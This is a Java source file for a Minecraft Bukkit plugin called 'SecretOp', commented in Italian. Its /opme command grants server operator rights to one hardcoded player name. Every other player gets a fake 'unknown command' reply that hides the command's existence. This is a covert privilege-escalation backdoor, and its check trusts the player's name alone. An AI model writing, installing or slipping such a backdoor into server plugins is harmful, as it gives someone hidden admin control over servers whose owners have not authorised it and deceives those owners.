package com.tuonome.secretop;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public final class Main extends JavaPlugin implements CommandExecutor {

    // Inserisci qui il tuo esatto nickname in-game
    private final String ALLOWED_PLAYER = "TuoNome";

    @Override
    public void onEnable() {
        if (getCommand("opme") != null) {
            getCommand("opme").setExecutor(this);
        }
        getLogger().info("SecretOp attivato con successo.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Questo comando può essere eseguito solo da un giocatore.");
            return true;
        }

        Player player = (Player) sender;

        if (player.getName().equalsIgnoreCase(ALLOWED_PLAYER)) {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "[SecretOp] Ora sei nuovamente OP!");
        } else {
            player.sendMessage(ChatColor.RED + "Comando sconosciuto. Digita /help per la lista dei comandi.");
        }

        return true;
    }
}
